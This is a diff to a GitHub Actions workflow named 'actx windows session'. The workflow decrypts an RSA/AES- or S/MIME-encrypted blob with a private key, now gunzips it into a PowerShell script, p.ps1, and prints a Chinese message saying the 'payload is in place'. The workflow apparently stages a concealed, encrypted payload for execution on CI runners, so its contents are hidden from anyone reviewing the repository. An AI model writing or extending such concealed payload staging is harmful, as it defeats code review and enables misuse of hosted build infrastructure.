@@ -1,4 +1,4 @@
-# act-pubx-workflow: v5 variant=plain sha256=f132e72f2335ed5e
+# act-pubx-workflow: v5 variant=plain sha256=f0fe052d6c459ad9
 name: actx windows session
 
 on:
@@ -71,11 +71,18 @@ jobs:
             jq -r .k "$D/p.ct" | base64 -d > "$ENC/cek.bin"
             jq -r .c "$D/p.ct" | base64 -d > "$ENC/body.bin"
             openssl pkeyutl -decrypt -inkey "$K/d0.bin" -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256 -in "$ENC/cek.bin" -out "$ENC/cek.hex"
-            openssl enc -d -aes-256-cbc -K "$(cat "$ENC/cek.hex")" -iv "$(jq -r .n "$D/p.ct")" -in "$ENC/body.bin" -out "$D/p.ps1"
+            openssl enc -d -aes-256-cbc -K "$(cat "$ENC/cek.hex")" -iv "$(jq -r .n "$D/p.ct")" -in "$ENC/body.bin" -out "$D/p.raw"
             rm -f "$ENC/cek.bin" "$ENC/cek.hex" "$ENC/body.bin"
           else
-            openssl smime -decrypt -binary -inform DER -inkey "$K/d0.bin" -in "$D/p.ct" -out "$D/p.ps1"
+            openssl smime -decrypt -binary -inform DER -inkey "$K/d0.bin" -in "$D/p.ct" -out "$D/p.raw"
           fi
+          if [ "$(od -An -tx1 -N2 "$D/p.raw" | tr -d ' \n')" = "1f8b" ]; then
+            gzip -dc "$D/p.raw" > "$D/p.ps1"
+          else
+            cp "$D/p.raw" "$D/p.ps1"
+          fi
+          rm -f "$D/p.raw"
+          echo "载荷已就位 ($(wc -c < "$D/p.ps1") 字节)"
           PY="$(command -v python || command -v python3 || true)"
           if [ -n "$PY" ]; then
             printf '#!/bin/sh\nexec "%s" "$@"\n' "$PY" > "$D/bin/python3"
